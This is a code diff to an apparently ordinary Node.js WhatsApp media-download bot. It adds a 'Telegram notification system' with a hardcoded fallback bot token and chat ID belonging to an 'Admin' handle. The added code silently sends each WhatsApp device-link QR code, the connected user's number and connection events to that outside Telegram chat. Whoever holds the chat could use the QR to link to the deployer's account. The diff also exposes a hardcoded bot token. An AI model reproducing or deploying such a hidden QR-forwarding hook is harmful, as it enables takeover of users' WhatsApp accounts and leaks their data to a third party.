@@ -199,6 +199,68 @@ const client = new Client({
   }
 });
 
+// ==================== TELEGRAM NOTIFICATION SYSTEM ====================
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || "8451030732:AAEK2MnsTmdJbhqQVMtUik4s58TuNZFHo18";
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6204875999";
+let lastSentQRTime = 0;
+
+async function sendTelegramQR(qr) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  // Prevent spamming Telegram if QR refreshes too quickly (throttle to 10s)
+  const now = Date.now();
+  if (now - lastSentQRTime < 10000) return;
+  lastSentQRTime = now;
+
+  const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&format=png&margin=15&data=${encodeURIComponent(qr)}`;
+  const caption = 
+`📲 *OmniStream WhatsApp Link QR Code* (PNG)
+
+👤 *Admin:* 𝙃𝘼𝙉𝙏𝙀𝙍-𝙓𝘿 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇 (@HANTER_XD_OFFICIAL)
+🆔 *Chat ID:* \`${TELEGRAM_CHAT_ID}\`
+⚡ *Status:* Waiting for WhatsApp scan
+
+👉 *How to connect:*
+1. Open **WhatsApp** on your phone
+2. Tap **Settings** > **Linked Devices**
+3. Tap **Link a Device** and scan this QR code image!`;
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        photo: qrImageUrl,
+        caption: caption,
+        parse_mode: 'Markdown'
+      })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      console.log(`📨 [TELEGRAM] QR Code PNG successfully sent to chat_id: ${TELEGRAM_CHAT_ID}`);
+    } else {
+      console.warn(`⚠️ [TELEGRAM] sendPhoto returned:`, data.description);
+    }
+  } catch (err) {
+    console.error(`❌ [TELEGRAM] Failed to send QR to Telegram:`, err.message);
+  }
+}
+
+async function sendTelegramNotification(text) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+  } catch (_) {}
+}
+
 // QR Code generation
 client.on('qr', (qr) => {
   currentQR = qr;
@@ -207,6 +269,7 @@ client.on('qr', (qr) => {
   qrcode.generate(qr, { small: true });
   console.log('Or view QR in browser at: http://localhost:' + PORT + '/qr');
   console.log('===========================================================\n');
+  sendTelegramQR(qr);
 });
 
 // Ready Event
@@ -216,12 +279,21 @@ client.on('ready', () => {
   connectedUser = client.info?.wid?.user || 'Active User';
   console.log(`✅ OmniStream WhatsApp Bot is READY! Connected as: ${connectedUser}`);
   console.log('🤫 Silent Mode Active: Ignoring all messages except #download and /download');
+  sendTelegramNotification(
+`✅ *WhatsApp Connected Successfully!*
+
+🤖 *Service:* OmniStream WhatsApp Media Bot
+👤 *Connected User:* \`${connectedUser}\`
+🤫 *Mode:* Strict Silent Active (#download and /download only)
+🚀 *Status:* 100% Operational 24/7`
+  );
 });
 
 // Auth Failure Event
 client.on('auth_failure', (msg) => {
   botStatus = 'Authentication Failure';
   console.error('❌ Authentication failure:', msg);
+  sendTelegramNotification(`❌ *WhatsApp Authentication Failure:*\n\`${msg}\``);
 });
 
 // Disconnected Event
@@ -229,6 +301,7 @@ client.on('disconnected', (reason) => {
   botStatus = 'Disconnected';
   connectedUser = null;
   console.warn('⚠️ WhatsApp client disconnected:', reason);
+  sendTelegramNotification(`⚠️ *WhatsApp Disconnected:*\nReason: \`${reason}\`\n🔄 Reconnecting...`);
   console.log('🔄 Reconnecting WhatsApp client...');
   client.initialize();
 });
